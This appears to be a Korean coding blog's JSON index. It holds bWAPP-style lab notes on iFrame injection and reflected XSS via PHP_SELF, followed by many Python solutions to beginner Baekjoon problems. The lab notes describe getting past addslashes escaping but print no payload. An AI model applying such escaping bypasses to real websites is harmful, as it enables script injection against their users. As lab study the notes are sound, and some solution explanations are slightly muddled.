쓰지말라는 주의가 적혀져 있다. High12345678910function xss_check_3($data, $encoding = &quot;UTF-8&quot;){ // htmlspecialchars - converts special characters to HTML entities // '&amp;' (ampersand) becomes '&amp;amp;' // '&quot;' (double quote) becomes '&amp;quot;' when ENT_NOQUOTES is not set // &quot;'&quot; (single quote) becomes '&amp;#039;' (or &amp;apos;) only when ENT_QUOTES is set // '&lt;' (less than) becomes '&amp;lt;' // '&gt;' (greater than) becomes '&amp;gt;' return htmlspecialchars($data, ENT_QUOTES, $encoding); } HTML Injection의 High Level처럼 htmlspecialchars 함수를 사용하여 유효성 검사를 하였다.","link":"/2020/12/08/iFrame-Injection-1/"},{"title":"XSS - Reflected (PHP_SELF)","text":"PHP_SELF1$_SERVER['PHP_SELF'] 현재 실행중인 파일(자신)의 경로 + 파일명을 담은 전역변수 웹에선 URL상의 경로가 출력됨. CLI에서는 접근한 경로가 그대로 출력. 문제 풀이Low first name과 last name에 값을 넣으면 그대로 출력하는 페이지이다. 이를 이용하여 XSS 코드를 반영하겠다. Medium ', &quot;, \\의 앞에 \\가 추가된 값으로 이스케이프된 것을 볼 수 있다. 아마 addslashes() 함수로 입력값에 대한 이스케이프를 진행 한 것으로 추측이 된다. 이를 우회하기 위해선 Low Level의 방식처럼 ', &quot;, \\를 사용 안하는 방법으로 XSS 코드를 입력할 수 있다. High htmlspecialchars 함수로 특수문자가 HTML 엔티티로 이스케이프로 되어 XSS 코드가 제대로 반영이 안된 것을 볼 수 있다.","link":"/2021/02/24/phpMyAdmin-BBCode-Tag-XSS/"},{"title":"백준 브론즈4 - 15963번 문제","text":"CASIO카시오 계산기는 만능 계산기이다. 시험을 한 번이라도 쳐본 일곽인이라면, 이 카시오의 소중함에 대해서 뼈저리게 느껴보았을 것이다. 하지만, 이런 카시오에도 함정이 있다. 바로, 카시오 계산기는 배터리를 통해 돌아간다는 것이다. 송찬이는 시험을 치다가 갑자기 계산기의 배터리가 나가버렸다. 그래서 선생님께 배터리를 달라고 요구했는데, 요구하고 보니 카시오 계산기의 배터리가 어떤 종류인지 말을 안 해버렸다! 과연 선생님은 송찬이가 필요한 배터리 종류를 들고 왔을까? 문제풀이12n, m = map(int, input().split())print(1 if n==m else 0) 삼항연산자로 깔끔하게 풀이하였다.파이썬의 삼항연산자 형태는 [True Value] if [Condition] else [False Value]으로 이루어진다. 숏코딩 문제풀이1print(2-len({*input().split()})) 두 개의 입력 중복을 확인하는 문제이다.이 풀이는 딕셔너리의 Key 중복이 안된다는 점을 이용하였다. 입력 받은 값을 Key로 저장되는데 만약 같은 값이면 단 하나만 저장이 되기 때문에 len 함수를 찍어본다면 ‘1’로 출력하게 된다. 만약 두 개의 입력값이 서로 다른 값이면 2개의 Key가 저장이 되고, len 함수는 ‘2’를 출력할 것이다. 2개의 입력값이 중복이면 1, 아니면 0이므로 2와 len 함수의 출력값을 빼준다면 원하는 값을 얻을 수 있다. 이 문제에선 Dict를 이용했지만, set으로 이용할 수 있다.","link":"/2021/02/06/%EB%B0%B1%EC%A4%80-15963%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈5 - 1001번 문제","text":"백준 1001번 문제A-BLink : https://www.acmicpc.net/problem/1001 1print(int(input())-int(input())) 1000번 문제처럼 데이터를 입력받아 정수형으로 변환하여 -를 해주었다.하지만 결과는? 런타임 에러이유는 모르겠다… 혹시 아시는 분은 댓글 부탁드립니다… 일단 입력값은 ‘3 2’이다. 이를 입력받아야히는데 어떻게 입력을 받아야할까? 123a, b = input().split()print(a)print(b) split함수를 사용하면 하나의 input함수로 여러 변수에 값을 넣어줄 수 있다. splitLink : https://wikidocs.net/13#split split함수는 문자열을 나누는 함수이다. 12s = 'a b c d'print(s.split()) # ['a', 'b', 'c', 'd'] 출력 list로 return되어지만, input에는 각 하나씩 입력되어 변수에 저장될 것이다.이를 이용해서 문제를 해결해보자. 12a, b = input().split()print(int(a)-int(b)) input은 문자열로 데이터를 넣어주기 때문에 값을 계산하기 위해서는 정수 변환이 필수이다.하지만 입력받은 정수가 100개라면? 하나하나 int함수를 넣어서 계산해야하나?답은 map함수에 있다. mapLink : https://wikidocs.net/32#map map(f, iterable)로 함수(f)와 반복 가능한(iterable) 자료형을 입력받아 f에 iterable를 넣어서 f의 결과를 묶어서 돌려주는 함수이다.","link":"/2020/11/07/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EB%93%9C5-1001%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈 10817번 문제","text":"세수세 정수 A, B, C가 주어진다. 이때, 두 번째로 큰 정수를 출력하는 프로그램을 작성하시오. 문제 풀이12n = [*map(int, input().split())]print(sorted(n, reverse=True)[1]) 풀이 설명3개의 값들을 정렬한 후 두번째 값을 출력한다.","link":"/2021/03/20/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%88-10817%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈 10871번 문제","text":"X보다 작은 수정수 N개로 이루어진 수열 A와 정수 X가 주어진다. 이때, A에서 X보다 작은 수를 모두 출력하는 프로그램을 작성하시오. 문제 풀이1234n = [*map(int, input().split())]m = [*map(int, input().split())][print(i, end=' ') for i in m if n[1] &gt; i] 풀이 설명List Comprehention과 if문을 이용하여 간단하게 풀이 하였다.","link":"/2021/03/20/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%88-10871%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈 10950번 문제","text":"A+B - 3두 정수 A와 B를 입력받은 다음, A+B를 출력하는 프로그램을 작성하시오. 문제 풀이1234n = int(input())for _ in range(n): m = [*map(int, input().split())] print(sum(m)) 풀이 설명문제의 조건대로 케이스를 입력할 때 마다 입력값 두 개를 더한 값을 출력하였다.","link":"/2021/03/20/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%88-10950%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈 11282번 문제","text":"한글한글의 각 글자는 초성, 중성, 종성으로 이루어져 있고, 이 세 가지를 모아써서 한 글자를 나타낸다. 초성은 ㄱ, ㄲ, ㄴ, ㄷ, ㄸ, ㄹ, ㅁ, ㅂ, ㅃ, ㅅ, ㅆ, ㅇ, ㅈ, ㅉ, ㅊ, ㅋ, ㅌ, ㅍ, ㅎ로 총 19개가 있고, 중성은 ㅏ, ㅐ, ㅑ, ㅒ, ㅓ, ㅔ, ㅕ ㅖ, ㅗ, ㅘ, ㅙ, ㅚ, ㅛ, ㅜ, ㅝ, ㅞ, ㅟ, ㅠ, ㅡ, ㅢ, ㅣ로 총 21개, 종성은 없음, ㄱ, ㄲ, ㄳ, ㄴ, ㄵ, ㄶ, ㄷ, ㄹ, ㄺ, ㄻ, ㄼ, ㄽ, ㄾ, ㄿ, ㅀ, ㅁ, ㅂ, ㅄ, ㅅ, ㅆ, ㅇ, ㅈ, ㅊ, ㅋ, ㅌ, ㅍ, ㅎ로 총 28개가 있다. 첫 번째 글자는 초성에서 ㄱ, 중성에서 ㅏ, 종성에서 없음을 합친 “가”가 되고, 두 번째 글자는 초성에서 ㄱ, 중성에서 ㅏ, 종성에서 ㄱ을 합친 “각”이 된다. 마지막 글자는 초성에서 ㅎ, 중성에서 ㅣ, 종성에서 ㅎ를 합친 “힣”이 된다. 초성과 중성, 그리고 종성을 합쳐서 만들 수 있는 글자의 개수는 총 192128 = 11,172개가 된다. 입력으로 N이 주어졌을 때, N번째 글자를 구하는 프로그램을 작성하시오. 문제 풀이1print(chr(44031+int(input()))) 풀이 설명chr 함수을 알고 있으면 쉽게 풀 수 있는 문제이다. 유니코드는 문제 설명과 같이 차례대로 한글이 정해져 있다. 현재 이 문제는 이를 아는지 확인하는 문제이다. ord 함수를 이용하여 ‘가’를 유니코드로 변경한다면 44032이라는 값이 출력이 된다. 이를 이용하여 44031과 입력값을 더한 다음 chr함수로 문자로 변환하면 된다.","link":"/2021/03/14/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%88-11282%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈 2739번 문제","text":"구구단N을 입력받은 뒤, 구구단 N단을 출력하는 프로그램을 작성하시오. 출력 형식에 맞춰서 출력하면 된다. 문제 풀이12n = int(input())[print(f'{n} * {i} = {n*i}') for i in range(1, 10)] 풀이 설명List Comprehension을 이용하여 간단하게 풀이하였다.","link":"/2021/03/17/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%88-12926704%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈 14623번 문제","text":"감정이입감정이입에 대해서 알고 있는가? 감정이입이란 자신의 감정을 특정 대상에 이입시키거나 특정 대상의 감정을 자신에게 이입시켜서 서로 공감하는 것이다. 이렇게 자신이 다른 대상이 됐다고 생각을 하면 그전에는 느끼지 못했던 감정을 느낄 수 있어 풍부한 사고를 할 수 있다. 감정이입에 몰입하게 되면 어떠한 단계에 이르게 된다. 이 단계에서는 자신이 감정이입을 하는 대상이 되어 사고를 할 수 있게 된다. 예로부터 많은 천재들이 이 단계에 다다라 많은 업적을 세웠다. 알베르트 아인슈타인은 빛이 되어 상대성 이론을 발견했고, 찰리 채플린은 자신이 연기하는 대상 그 자체가 되어 많은 사람들이 기억하는 희극배우가 됐다. 컴퓨터 공학에서도 이런 단계에 다다를 수 있을까? CPU가 되어서 주변 입/출력 장치를 제어하거나, 뉴럴 네트워크에 존재하는 수많은 뉴런들 중 한 뉴런이 되어 계산에 관여하는 상상을 할 수 있을까? 천 리 길도 한 걸음부터. 컴퓨터에서는 없어서 안될 ALU(Arithmetic Logic Unit)가 되는 상상을 해보자. ALU는 두 이진수의 산술 연산 혹은 논리 연산을 계산하는 회로다. 두 이진수가 주어졌을 때 덧셈은 가산기를, 뺄셈은 보수기와 가산기를 이용해 이루어진다. 그렇다면 두 이진수의 곱셈은 어떻게 이루어 질까? ALU가 되어 이 문제를 해결해보자. 문제풀이1print(bin(int(input(), 2) * int(input(), 2))[2:])","link":"/2021/03/05/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%88-14623%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈 15700번 문제","text":"타일 채우기4N×M 크기의 벽에 2×1, 1×2 크기의 타일을 채우려고 한다. 겹치지 않게 놓는다면, 최대 몇 개를 채울 수 있을까? 문제풀이12a, b = map(int, input().split())print(a*b//2) 풀이 설명2x1과 1x2는 2개의 타일을 뜻한다. 입력한 벽의 크기를 실제 크기로 구하고, 2로 나누면 총 몇 개를 채울 수 있는지를 알아낼 수 있다.","link":"/2021/03/10/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%88-15700%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈 16199번 문제","text":"나이 계산하기한국에서 나이는 총 3가지 종류가 있다. 만 나이: 국제적인 표준 방법이다. 한국에서도 법에서는 만 나이만을 사용한다. 세는 나이: 한국에서 보통 나이를 물어보면 세는 나이를 의미한다. 연 나이: 법률에서 일괄적으로 사람을 구분하기 위해서 사용하는 나이이다. 만 나이는 생일을 기준으로 계산한다. 어떤 사람이 태어났을 때, 그 사람의 나이는 0세이고, 생일이 지날 때마다 1세가 증가한다. 예를 들어, 생일이 2003년 3월 5일인 사람은 2004년 3월 4일까지 0세이고, 2004년 3월 5일부터 2005년 3월 4일까지 1세이다. 세는 나이는 생년을 기준으로 계산한다. 어떤 사람이 태어났을 때, 그 사람의 나이는 1세이고, 연도가 바뀔 때마다 1세가 증가한다. 예를 들어, 생일이 2003년 3월 5일인 사람은 2003년 12월 31일까지 1세이고, 2004년 1월 1일부터 2004년 12월 31일까지 2세이다. 연 나이는 생년을 기준으로 계산하고, 현재 연도에서 생년을 뺀 값이다. 예를 들어, 생일이 2003년 3월 5일인 사람은 2003년 12월 31일까지 0세이고, 2004년 1월 1일부터 2004년 12월 31일까지 1세이다. 어떤 사람의 생년월일과 기준 날짜가 주어졌을 때, 기준 날짜를 기준으로 그 사람의 만 나이, 세는 나이, 연 나이를 모두 구하는 프로그램을 작성하시오. 문제풀이123456789101112131415a = [*map(int, input().split())]b = [*map(int, input().split())]if b[1] - a[1] &gt; 0: print(b[0]-a[0])elif b[1] == a[1]: if b[2] - a[2] &gt;= 0: print(b[0]-a[0]) else: print(b[0]-a[0]-1)else: print(b[0]-a[0]-1)print(b[0]-a[0]+1)print(b[0]-a[0]) 풀이 설명세는 나이와 연 나이는 생년과 기준 년도를 빼주면 쉬게 구할 수 있다. 하지만, 만 나이는 조건이 있다. 기준 월 - 생월의 값 &gt; 0일 경우 기준 월 - 생월의 값 &lt; 0일 경우 기준 월 == 생월일 경우 이렇게 3가지로 구분된다. 만 나이는 생일이 지나야 나이를 먹기 때문에 월에 기준을 준다. 1번의 경우는 생일이 지났기 때문에 기준 년 - 생년을 해주면 구할 수 있다. 2번의 경우는 생일이 안지났기 때문에 기준 년 - 생년 - 1을 해줘야 한다. 3번의 경우에서 생일이 지났는지 안 지났는지로 또 나누어진다. 생일이 지났으면, 기준 년 - 생년을 해주면 되고, 아니면 기준 년 - 생년 - 1을 해주면 된다.","link":"/2021/03/11/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%88-16199%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈 17009번 문제","text":"Winning ScoreYou record all of the scoring activity at a basketball game. Points are scored by a 3-point shot, a 2-point field goal, or a 1-point free throw. You know the number of each of these types of scoring for the two teams: the Apples and the Bananas. Your job is to determine which team won, or if the game ended in a tie. 문제풀이1234567a = [int(input()) for _ in range(3)]b = [int(input()) for _ in range(3)]a_score = a[0] * 3 + a[1] * 2 + a[2]b_score = b[0] * 3 + b[1] * 2 + b[2]print([['A', 'T'][a_score == b_score], 'B'][a_score &lt; b_score])","link":"/2021/03/05/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%88-17009%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈 2438번 문제","text":"별 찍기 - 1첫째 줄에는 별 1개, 둘째 줄에는 별 2개, N번째 줄에는 별 N개를 찍는 문제 문제 풀이12n = int(input())[print('*' * i) for i in range(1, n+1)] 풀이 설명List Comprehention을 이용하여 간단하게 풀이하였다.","link":"/2021/03/17/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%88-2438%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈 2439번 문제","text":"별 찍기 - 2첫째 줄에는 별 1개, 둘째 줄에는 별 2개, N번째 줄에는 별 N개를 찍는 문제 하지만, 오른쪽을 기준으로 정렬한 별(예제 참고)을 출력하시오. 문제 풀이12n = int(input())[print(' ' * (n-i) + '*' * i) for i in range(1, n+1)] 풀이 설명별 찍기 - 1과 똑같이 풀이 하였다.","link":"/2021/03/18/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%88-2439%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈 2798번 문제","text":"블랙잭카지노에서 제일 인기 있는 게임 블랙잭의 규칙은 상당히 쉽다. 카드의 합이 21을 넘지 않는 한도 내에서, 카드의 합을 최대한 크게 만드는 게임이다. 블랙잭은 카지노마다 다양한 규정이 있다. 한국 최고의 블랙잭 고수 김정인은 새로운 블랙잭 규칙을 만들어 상근, 창영이와 게임하려고 한다. 김정인 버전의 블랙잭에서 각 카드에는 양의 정수가 쓰여 있다. 그 다음, 딜러는 N장의 카드를 모두 숫자가 보이도록 바닥에 놓는다. 그런 후에 딜러는 숫자 M을 크게 외친다. 이제 플레이어는 제한된 시간 안에 N장의 카드 중에서 3장의 카드를 골라야 한다. 블랙잭 변형 게임이기 때문에, 플레이어가 고른 카드의 합은 M을 넘지 않으면서 M과 최대한 가깝게 만들어야 한다. N장의 카드에 써져 있는 숫자가 주어졌을 때, M을 넘지 않으면서 M에 최대한 가까운 카드 3장의 합을 구해 출력하시오. 문제풀이1234567891011121314n, m = map(int, input().split())data = [*map(int, input().split())]result = 0length = len(data)for i in range(length): for j in range(i+1, length): for k in range(j+1, length): sum_value = data[i] + data[j] + data[k] if sum_value &lt;= m: result = max(result, sum_value)print(result) 풀이 설명두번째로 입력 받은 입력값에서 m보다 작지만 가장 가까운 3개의 합을 구해야한다. 구하려면 모든 경우의 수를 구해야한다. data[0] + data[1] + data[2] data[0] + data[1] + data[3] data[0] + data[1] + data[4] 위와 같은 순으로 반복문을 돌려서 모든 경우의 수를 구하고, 합한 값이 m보다 작거나 같으면 result와 크기 비교 후 result에 저장을 하였다. 이러면, 조건에 만족하는 값들 중에 가장 큰 수를 저장 할 수 있어고 그 값이 저장이 된다.","link":"/2021/02/27/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%882-2798%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈 2920번 문제","text":"음계다장조는 c d e f g a b C, 총 8개 음으로 이루어져있다. 이 문제에서 8개 음은 다음과 같이 숫자로 바꾸어 표현한다. c는 1로, d는 2로, …, C를 8로 바꾼다. 1부터 8까지 차례대로 연주한다면 ascending, 8부터 1까지 차례대로 연주한다면 descending, 둘 다 아니라면 mixed 이다. 연주한 순서가 주어졌을 때, 이것이 ascending인지, descending인지, 아니면 mixed인지 판별하는 프로그램을 작성하시오. 문제풀이11234567891011121314151617181920212223242526272829n = [*map(int, input().split())]count_check = Trueif n[0] == 1: for i in range(len(n)-1): if n[i] &lt; n[i+1]: continue else: count_check = False if count_check == False: print('mixed') break if count_check == True: print('ascending')elif n[0] == 8: for i in range(len(n)-1): if n[i] &gt; n[i+1]: continue else: count_check = False if count_check == False: print('mixed') break if count_check == True: print('descending')else: print('mixed') 풀이1 설명문제에서 나타는 경우의 수는, 1 2 3 4 5 6 7 8 : ‘ascending’ 8 7 6 5 4 3 2 1 : ‘descending’ 둘 다 아니면 mixed 위 3개로 볼 수 있다. 그래서 나는 입력받은 값들을 리스트로 저장하여, 맨 첫번째 자리를 검사였다. 만약 1이면, ascending인 오름차순 만약 8이면, descending인 내림차순 둘 다 아니면 mixed 그 후, 진짜 오름차순과 내림차순으로 되어 있는지 검사를 하였다. 문제풀이21234567891011121314151617181920n = [*map(int, input().split())]ascending = Truedescending = Truefor i in range(len(n)-1): if n[i] &lt; n[i+1]: descending = False elif n[i] &gt; n[i+1]: ascending = False else: ascending = False descending = Falseif ascending: print('ascending')elif descending: print('descending')else: print('mixed') 풀이2 설명여기선 내가 깊이 생각을 못 했던 것이 있었다. 굳이 첫번째 자리를 비교를 했어야 했는지와 왜 검사 값을 1개만 썼는지이다. 이 문제풀이에선 오름차순과 내림차순을 검사하는 변수인 ascending과 descending이 있다. 반복문으로 리스트화 된 입력값을 두 개씩 비교 후 오름차순인지 내림차순인지를 검사를 한다. 둘 다 False이면, mixed가 나온다. 문제풀이1에서 더욱 간단하게 짜여졌고, 가독성도 더 좋아 보인다.","link":"/2021/02/28/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%882-2920%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 10039번 문제","text":"백준 10039번 문제평균 점수상현이가 가르치는 아이폰 앱 개발 수업의 수강생은 원섭, 세희, 상근, 숭, 강수이다.어제 이 수업의 기말고사가 있었고, 상현이는 지금 학생들의 기말고사 시험지를 채점하고 있다. 기말고사 점수가 40점 이상인 학생들은 그 점수 그대로 자신의 성적이 된다. 하지만, 40점 미만인 학생들은 보충학습을 듣는 #### 조건을 수락하면 40점을 받게 된다. 보충학습은 거부할 수 없기 때문에, 40점 미만인 학생들은 항상 40점을 받게 된다.학생 5명의 점수가 주어졌을 때, 평균 점수를 구하는 프로그램을 작성하시오.Link : https://www.acmicpc.net/problem/2753 1234567num = [i for i in map(int, open(0))]sum = 0for i in num: if i &lt; 40: i = 40 sum += i print(sum//5) 저 코드는 c언어 스타일의 코드이다.파이썬스럽게 수정하겠다. 1print(eval(&quot;+max(8,int(input())//5)&quot;*5)) 차근차근 설명하자면, int(input())//5으로 나누었다. 하지만 max 함수를 이용하여 나눈 값이 8보다 낮으면, 8로 출력하게 하였다.생각 없이 보고 있다면, 왜 8인지를 모르는 사람이 있을 것이다. 이유는 40/5 = 8 이므로, 40보다 작으면 8보다 작다는 공식이 성립이 된다. 그 후, eval를 이용하기 위해 문자열로 만들었고, 평균 값을 구하기 위해 나눈 값 앞에 +를 해주었다. 또한 문자열은 곱하기를 해주면 반복함으로 5번 입력받아 5명의 점수를 입력하였다.","link":"/2020/12/30/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-10039%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 1008번 문제","text":"백준 1008번 문제A / B두 정수 A와 B를 입력받은 다음, A/B를 출력하는 프로그램을 작성하시오.Link : https://www.acmicpc.net/problem/1008 1print(eval(input().replace(' ', '/'))) eval을 이용하여 문제 풀이를 하였다.eval이 무엇인지 궁금하신 분들은 백준 브론즈5 - 1000번 문제에서 설명하였다.Link : lrtk-coder.github.io/2020/11/07/백준-브론즈5-1001번-문제/","link":"/2020/12/07/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-1008%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 10101번 문제","text":"백준 브론즈4 10101번 문제창영이는 삼각형의 종류를 잘 구분하지 못한다. 따라서 프로그램을 이용해 이를 외우려고 한다.삼각형의 세 각을 입력받은 다음, * 세 각의 크기가 모두 60이면, Equilateral * 세 각의 합이 180이고, 두 각이 같은 경우에는 Isosceles * 세 각의 합이 180이고, 같은 각이 없는 경우에는 Scalene * 세 각의 합이 180이 아닌 경우에는 Error를 출력하는 프로그램을 작성하시오.10101번: 삼각형 외우기 문제풀이123456a = sorted(list(map(int, open(0))))if a[0]+a[1]+a[2] != 180: print('Error')else: if a[0] &lt; a[1] &lt; a[2]: print('Scalene') elif a[0] == a[2]: print('Equilateral') else: print('Isosceles') 이번 문제는 삼각형의 3변의 길이를 이용하여 각을 찾는 문제이다.3변의 길이가 같으면, 3개의 각 크기도 같으니 Equilateral2변의 길이가 같으면, 2개의 각 크기도 같으니 Isosceles같은게 없으면, 같은 각도 없으니 Scalene 코드는 간단하게 작성하였다.이것을 인덱싱을 이용하여 구현하면, 거의 난독화 수준의 코드가 만들어진다. 숏코딩 문제풀이12a = sorted(list(map(int, open(0))))print([[['Isosceles', 'Scalene'][a[0] &lt; a[1] &lt; a[2]], 'Equilateral'][a[0] == a[2]], 'Error'][a[0]+a[1]+a[2] != 180])","link":"/2021/01/21/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-10101%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 10156번 문제","text":"백준 브론즈4 10156번 문제동수는 제과점에 과자를 사러 가는데 현재 가진 돈이 모자랄 경우 부모님께 모자란 돈을 받으려고 한다. 과자 한 개의 가격이 K, 사려고 하는 과자의 개수가 N이고, 현재 가진 돈의 액수를 M이라 할 때 여러분은 동수가 부모님께 받아야 하는 모자란 돈을 계산하려고 한다.예를 들어, 과자 한 개의 가격이 30원, 사려고 하는 과자의 개수가 4개, 현재 동수가 가진 돈이 100원이라 할 때, 동수가 부모님께 받아야 하는 돈은 20원이다. 과자 한 개의 가격이 250원, 사려고 하는 과자의 개수가 2개, 현재 동수가 가진 돈이 140원이라 할 때, 동수가 부모님께 받아야 하는 돈은 360원이다. 과자 한 개의 가격이 20원, 사려고 하는 과자의 개수가 6개, 현재 동수가 가진 돈이 120원이라 할 때 동수가 부모님께 받아야 하는 돈은 0원이다. 과자 한 개의 가격이 20원, 사려고 하는 과자의 개수가 10개, 현재 동수가 가진 돈이 320원이라 할 때 동수가 부모님께 받아야 하는 돈은 역시 0원이다.과자 한 개의 가격, 사려고 하는 과자의 개수와 동수가 현재 가진 돈의 액수가 주어질 때 동수가 부모님께 받아야 하는 돈의 액수를 출력하는 프로그램을 작성하시오. 문제풀이123a, b, c = map(int, input().split())if a*b &gt; c: print(a*b-c)else: print(0) 조건문과 사칙 연산을 이용하여 문제를 풀이하였다. 숏코딩 문제풀이12a, b, c = map(int, input().split())print(max(a*b-c, 0)) Max 함수를 이용하여 조건문을 사용하지 않고 해결하였다.여유 돈보다 구입액이 많으면 양수가 나와서 0보다 크므로 차액이 나온다.그 반대는 음수가 나오므로 0이 큰 수가 되어 0이 나온다.","link":"/2021/01/21/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-10156%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 10162번 문제","text":"백준 브론즈4 10162번 문제3개의 시간조절용 버튼 A B C가 달린 전자레인지가 있다. 각 버튼마다 일정한 시간이 지정되어 있어 해당 버튼을 한번 누를 때마다 그 시간이 동작시간에 더해진다. 버튼 A, B, C에 지정된 시간은 각각 5분, 1분, 10초이다.냉동음식마다 전자레인지로 요리해야할 시간 T가 초단위로 표시되어 있다. 우리는 A, B, C 3개의 버튼을 적절히 눌러서 그 시간의 합이 정확히 T초가 되도록 해야 한다. 단 버튼 A, B, C를 누른 횟수의 합은 항상 최소가 되어야 한다. 이것을 최소버튼 조작이라고 한다.만일 요리시간이 100초라고 하면(T=100) B를 1번, C는 4번 누르면 된다. 이와 다르게 C를 10번 눌러도 100초가 되지만 이 경우 10번은 최소 횟수가 아니기 때문이 답이 될 수 없다. 이 경우 B 1번, C 4번, 총 5번이 최소버튼 조작이다. 그리고 T=234와 같이 3개의 버튼으로 시간을 정확히 맞출 수 없는 경우도 있다.여러분은 주어진 요리시간 T초를 맞추기 위한 최소버튼 조작 방법을 구하는 프로그램을 작성해야 한다.10162번: 전자레인지 문제풀이12345678910111213t = int(input())a = t//300n = t%300b = n//60n = n%60c = n//10n = n%10if (n!=0): print(-1)else: print(a, b, c) 기본적인 사칙 연산과 조건문을 이용하여 문제풀이를 하였다.a, b, c는 각각 5분, 1분, 10초라는 시간이 지정되어 있다. 초 단위로 변환을 하면300, 60, 10로 변환이 가능하다. 최소 횟수를 구하기 위해서는 큰 숫자 순으로 나누기를 하고, 나머지를 넘겨주어 나누어줬다. 만약 c까지 나누고, 나머지가 0이 아닌 경우는 답이 나올 수 없는 시간이라 -1를 출력하였다. 숏코딩 문제풀이12n=int(input())print(*[[-1],[n//300,n%300//60,n%300%60//10]][n%10&lt;1]) 기본 문제풀이와 같은 방식으로 진행이 되어지만, 추가적으로 인덱싱을 이용하여 코드를 간편화 시켰다. [[-1],[n//300,n%300//60,n%300%60//10]]은 기본 문제풀이를 참고하면 된다.[n%10&lt;1]은 c까지 나눈 나머지가 0이 아닌 경우를 False, 0이면 True 값을 이용하여 인덱싱을 하였다. 여기서 왜 10을 나눈 나머지를 이용하는가에 대한 의문을 가질 수 도 있다.이유는 c가 10이기 때문이다. 마지막 c로 나눈 나머지가 0이 아니면 그 값은 a,b,c로 조합하여 나올 수 없는 값이다.","link":"/2021/01/21/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-10162%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 10179번 문제","text":"쿠폰당신은 어떤 물건이라도 20% 할인해주는 쿠폰을 가지고 있다. 원래 가격이 주어질 때, 쿠폰을 사용하면 얼마가 되는지 알려주는 프로그램을 작성하시오. 문제풀이 list comprehension을 이용하여 판매가를 입력받아 리스트로 저장하였다. 그리고 for문을 이용하여 20%을 곱하여 할인된 가격을 출력하였다. 숏코딩 문제풀이 문자열로 표현된 문을 받아 실행하는 exec 함수를 이용하여 문제풀이를 하였다. exec 함수가 실행되기 전, 제일 마지막에 있는 int(input())은 문자열이 아니기 때문에 제일 먼저 실행이 된다. 문자열로 되어있는 부분은 exec 함수가 실행시키는 부분인데, 입력 받은 값을 *0.8을 해주어 할인가을 구하고 출력한다.","link":"/2021/02/11/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-10179%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 10707번 문제","text":"백준 브론즈4 10707번 문제JOI군이 살고 있는 지역에는 X사와 Y사, 두 개의 수도회사가 있다. 두 회사의 수도요금은 한 달간 수도의 사용량에 따라 다음과 같이 정해진다. X사 : 1리터당 A엔. Y사 : 기본요금은 B엔이고, 사용량이 C리터 이하라면 요금은 기본요금만 청구된다. 사용량이 C리터가 넘었을 경우 기본요금 B엔에 더해서 추가요금이 붙는다. 추가요금은 사용량이 C리터를 넘었을 경우 1리터를 넘었을 때마다 D엔이다. JOI군의 집에서 한 달간 쓰는 수도의 양은 P리터이다.수도요금이 최대한 싸게 되도록 수도회사를 고를 때, JOI군의 집의 1달간 수도요금을 구하여라.10707번: 수도요금 문제풀이1234a, b, c, d, p = map(int, open(0))if p &gt; c: y = d * (p-c) + belse: y = bprint(min(a*p, y)) 간단하게 문제풀이를 하였다. 숏코딩 문제풀이12a, b, c, d, p = map(int, open(0))print(min(a * p, max(0, p - c) * d + b)) 이 풀이는 수도의 양(a)이 사용량(p)보다 적을 때 음수가 나온다는 것을 이용한 문제 풀이이다.max 함수를 이용하여 만약 음수가 나올 경우 0를 나오게 하여 추가요금(c)와 곱한다. 그럼 0이 나오게 되며, 실질적으로 y 